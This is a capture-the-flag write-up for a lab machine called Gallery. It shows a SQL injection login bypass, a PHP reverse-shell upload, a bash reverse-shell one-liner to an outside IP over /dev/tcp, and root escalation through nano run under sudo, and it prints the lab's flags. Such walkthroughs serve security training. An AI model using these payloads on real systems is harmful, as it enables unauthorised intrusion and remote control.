# Gallery Write-up

## 1. Reconnaissance

First, I obtained the target IP address:

```text
10.129.145.82
```

I then performed an Nmap scan to identify the open ports and running services:

```bash
nmap -sV -sC -oN scan 10.129.145.82
```

The scan showed three open ports:

```text
22/tcp    open    ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open    http     Apache httpd 2.4.41
8080/tcp  open    http     Apache httpd 2.4.41
```

Port 80 displayed the default Apache page, while port 8080 hosted a **Simple Image Gallery System**.

---

## 2. Web Enumeration

I accessed the service running on port 8080:

```text
http://10.129.145.82:8080
```

The application redirected me to:

```text
http://10.129.145.82/gallery/login.php
```

This presented a login page.

### SQL Injection

I tested the login form for SQL injection.

For the username, I used:

```text
admin' #
```

The payload bypassed the login authentication, and I gained access to the application as **admin**.

---

## 3. Uploading a Reverse Shell

After logging in, I discovered that the application allowed images to be uploaded.

I also found that it accepted **PHP files**, which allowed me to upload a PHP reverse shell.

On my machine, I started a Netcat listener:

```bash
nc -lvnp 4444
```

After executing the uploaded PHP file, I received a reverse shell.

I was now connected to the target as:

```text
www-data
```

I then started enumerating the server and the web application's files.

---

## 4. Finding the User Password

While investigating the application and its database, I found an MD5 hash associated with the admin account.

I attempted to recover the original password from the hash, but I was unable to crack it.

Instead of continuing to focus on the hash, I continued enumerating the filesystem.

I found a backup directory under:

```text
/var/backups
```

Inside it was a backup of Mike's home directory:

```text
/var/backups/mike_home_backup
```

I listed its contents:

```bash
ls -al
```

Among the files was `.bash_history`.

I read it with:

```bash
cat .bash_history
```

The history contained:

```text
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

The password was therefore exposed in the backup's shell history.

---

## 5. Getting the User Flag

I used the password to switch from `www-data` to the `mike` account:

```bash
su mike
```

Then I went to Mike's home directory:

```bash
cd ~
ls
```

The `user.txt` file was present.

I read it:

```bash
cat user.txt
```

This gave me the **user flag**.

```
THM{af05cd30bfed67849befd546ef}
```

---

# 6. Privilege Escalation

Now that I had access as `mike`, I checked his sudo permissions:

```bash
sudo -l
```

The important entry was:

```text
User mike may run the following commands on ip-10-129-145-82:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

This meant that `mike` could execute `/opt/rootkit.sh` as **root without entering a password**.

I inspected the script:

```bash
cat /opt/rootkit.sh
```

The script contained:

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

The important part was the `read` option:

```bash
/bin/nano /root/report.txt
```

Since the entire script was executed with `sudo`, this meant **Nano was launched with root privileges**.

---

## 7. Getting a Root Shell

I executed the script as root:

```bash
sudo /bin/bash /opt/rootkit.sh
```

I selected:

```text
read
```

This opened:

```text
/root/report.txt
```

inside Nano with root privileges.

From Nano, I used its command execution functionality to execute a Bash reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/192.168.137.126/4444 0>&1"
```

Before doing this, I started another Netcat listener on my machine:

```bash
nc -lvnp 4444
```

The target connected back to me.

I verified my privileges:

```bash
id
```

The result showed:

```text
uid=0(root) gid=0(root) groups=0(root)
```

I had successfully obtained a **root shell**.

---

## 8. Root Flag

I moved to the root directory:

```bash
cd /root
ls
```

The directory contained:

```text
report.txt
report.txt.save
root.txt
```

I read the root flag:

```bash
cat root.txt
```

This gave me the **root flag**.

```
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

---

# Summary

The attack path was:

```text
Nmap
  ↓
Port 8080
  ↓
Gallery login
  ↓
SQL Injection
  ↓
Admin access
  ↓
PHP file upload
  ↓
Reverse shell as www-data
  ↓
/var/backups/mike_home_backup
  ↓
.bash_history
  ↓
Mike's password
  ↓
su mike
  ↓
User flag
  ↓
sudo -l
  ↓
/opt/rootkit.sh
  ↓
Nano running as root
  ↓
Command execution
  ↓
Root reverse shell
  ↓
Root flag
```

### Key Lessons

- Always enumerate web applications for authentication bypasses and file-upload vulnerabilities.
    
- Don't focus exclusively on cracking a discovered password hash; filesystem enumeration can reveal credentials elsewhere.
    
- Backup files can contain sensitive information such as `.bash_history`.
    
- After obtaining a user shell, always check `sudo -l`.
    
- When a root-executable script launches another program such as `nano`, investigate whether that program provides a way to execute commands.